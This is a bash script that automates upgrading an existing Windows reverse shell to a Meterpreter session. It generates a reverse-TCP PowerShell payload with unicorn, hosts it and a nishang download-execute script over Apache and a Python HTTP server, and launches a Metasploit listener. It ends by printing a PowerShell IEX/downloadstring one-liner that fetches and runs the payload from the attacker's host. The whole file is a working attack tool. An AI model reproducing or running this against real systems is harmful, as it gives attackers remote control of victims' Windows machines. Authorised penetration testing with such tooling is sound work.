#!/bin/bash
#This is a quick script that will generate a reverse meterpreter tcp powershell payload using unicorn
#and host it using apache. It will also host Download-Execute-PS.ps1 which is a powershell script
#that I grabbed from nishang toolset that downloads and executes the previously created payload
#
#At the end of the script a command will be printed to the screen
#You will need to paste this command into your existing normal reverse shell (windows/shell/reverse_tcp)
#
#
clear
echo ""
echo "Get Payload Options::"
echo -e -n "	LHOST: "
read lhost
echo -e -n "	LPORT: "
read lport
echo ""
echo "Creating reverse tcp meterpreter payload"
echo ""
./unicorn.py windows/meterpreter/reverse_tcp $lhost $lport > /dev/null 2>&1
mkdir /var/www/html > /dev/null 2>&1
cp powershell_attack.txt /var/www/html/powerup.txt
echo ""
echo "Launching Metasploit Listener"
xterm -fa monaco -fs 13 -bg black -e msfconsole -r unicorn.rc &
echo ""
cd execution
echo ""
echo "Get Port For Script::"
echo ""
echo -e -n "	Set LPORT for Script: "
read scriptport
echo ""
echo "Hosting exploit script on port " $scriptport
xterm -fa monaco -fs 13 -bg black -e python -m SimpleHTTPServer $scriptport &
echo ""
echo "Hosting upgrade payload via apache"
service apache2 restart > /dev/null 2>&1
echo ""
echo "Please paste this into your current windows shell: "
echo ""
echo ""
echo "powershell.exe "\"IEX \(new-object net.webclient\).downloadstring\("'"http://$lhost:$scriptport/Download-Execute-PS.ps1"'"\)";"Download-Execute-PS http://$lhost/powerup.txt";""\""
